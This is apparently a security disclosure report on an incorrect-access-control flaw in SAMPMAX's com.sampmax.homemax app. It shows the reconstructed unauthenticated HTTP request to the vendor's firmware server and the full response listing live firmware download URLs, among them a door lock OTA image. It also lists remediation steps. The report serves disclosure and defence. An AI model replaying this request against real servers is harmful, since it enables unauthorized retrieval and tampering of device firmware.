# Vulnerability Report - com.sampmax.homemax- Incorrect Access Control

**Product:** `com.sampmax.homemax` 

**Vendor:** [SAMPMAX](https://www.sampmax.com/)

**Version:** 2.1.2.7

**Vulnerability Type:** Incorrect Access Control

**Severity:** High

## Description

The `com.sampmax.homemax` , developed by SAMPMAX, suffers from an Incorrect Access Control vulnerability during the device firmware update process. The app uses HTTPS requests to download firmware updates. By reverse engineering the app, it was possible to identify the firmware download mechanism and the download link. Dynamic testing revealed that the vendor's firmware server lacks proper access control, leading to **firmware leakage**.

## Reproduction Steps

1. The `getGatewayNewVersion` String value in the `GatewayInfoPresenter` class provides the necessary URL and other information required for the HTTP request. Static reverse engineering allows for the reconstruction of the complete request as follows:

   ![image-20241002234349612](https://s2.loli.net/2024/10/02/wuLRQCm7qkW4gVH.png)

2. Sending this URL request to the firmware server results in a direct response containing the latest firmware information as follows:

   > Request

   ```http
   GET https://dev.fbeecloud.com/backup/binupd.js HTTP/1.1
   Host: dev.fbeecloud.com
   Content-Type: text/plain
   ```

   > Response:

   ```http
   HTTP/1.1 200 OK
   Server: nginx
   Date: Wed, 02 Oct 2024 15:32:13 GMT
   Content-Type: application/javascript; charset=utf-8
   Content-Length: 1754
   Last-Modified: Tue, 12 Mar 2024 08:13:36 GMT
   Connection: keep-alive
   Vary: Accept-Encoding
   ETag: "65f00eb0-6da"
   Expires: Thu, 03 Oct 2024 03:32:13 GMT
   Cache-Control: max-age=43200
   Accept-Ranges: bytes
   
   [{"binname":"GD","binupdlog":"","verName":"1.1.1","url":"http:\/\/dev.fbeecloud.com\/backup\/devcloud12.bin"},{"binname":"LM","binupdlog":"","verName":"1.5.6","url":"http:\/\/www.fbeecloud.com\/app\/lm3s156.bin"},{"binname":"GW","binupdlog":"","verName":"5.0.8","url":"http:\/\/www.fbeecloud.com\/app\/gw508.bin"},{"binname":"Sky","binupdlog":"","verName":"s.2.7","url":"http:\/\/www.fbeecloud.com\/app\/gateway_S27.bin"},{"binname":"FGR87T5","binupdlog":"","verName":"3.0.3","url":"http:\/\/www.fbeecloud.com\/app\/FGR87T5303.bin"},{"binname":"DoorLock","binupdlog":"","verName":"1.9","url":"http:\/\/www.fbeecloud.com\/app\/DoorLock_019.ota"},{"binname":"FGA87M4","verName":"R.0.4","binupdlog":"","url":"http:\/\/www.fbeecloud.com\/app\/FGA87M4_R041.bin"},{"binname":"FEIBIT4","verName":"F.0.3","binupdlog":"","url":"http:\/\/dev.fbeecloud.com\/backup\/FEIBIT4_F.0.3.bin"},{"binname":"FGL80Q0","verName":"D.4.C","binupdlog":"","url":"http:\/\/dev.fbeecloud.com\/backup\/FGL80Q0-firmware-D4C-54-52-20200609-wifioff.tar"},{"binname":"FGC80M4","verName":"D.4.3","binupdlog":"","url":"http:\/\/dev.fbeecloud.com\/backup\/FGC80M4-firmware-D43-42-49-20200403.tar1.gz"},{"binname":"FGC80M4-Test","verName":"D.3.6","binupdlog":"","url":"http:\/\/dev.fbeecloud.com\/backup\/FGC80M4-firmware-D36-201910170.tar.gz"},{"binname":"FGC89T0","verName":"L.0.3","binupdlog":"","url":"http:\/\/dev.fbeecloud.com\/backup\/FGC89T0-L.0.3.tar1.gz"},{"binname":"test_GM","verName":"1.0","binupdlog":"","url":"http:\/\/dev.fbeecloud.com\/backup\/libGM_sigmaStar.so"},{"binname":"CO","verName":"N.6.7","binupdlog":"","url":"http:\/\/dev.fbeecloud.com\/backup\/FStack_GW.bin"},{"binname":"GM","verName":"1.1.0","binupdlog":"","url":"http:\/\/dev.fbeecloud.com\/backup\/GManage"}]
   ```
   
3. Consequently, the unprotected firmware can be directly downloaded using this information.

   ![image-20241002234447957](https://s2.loli.net/2024/10/02/fV7MCWFxyYqv5LU.png)


## Impact

An attacker can exploit this vulnerability to:

* Download the latest firmware before it is officially released.
* Analyze the firmware for vulnerabilities or proprietary information.
* Create modified firmware images with malicious code.
* Distribute compromised firmware updates to unsuspecting users.

## Remediation

* Implement proper access control on the firmware server, such as device ID and user ID verification.
* Enhance the app's firmware update mechanism to include authentication credentials in the requests.


## Disclaimer

This vulnerability report is provided for informational purposes only and should not be used for any malicious activities. The author is not responsible for any misuse of the information contained herein.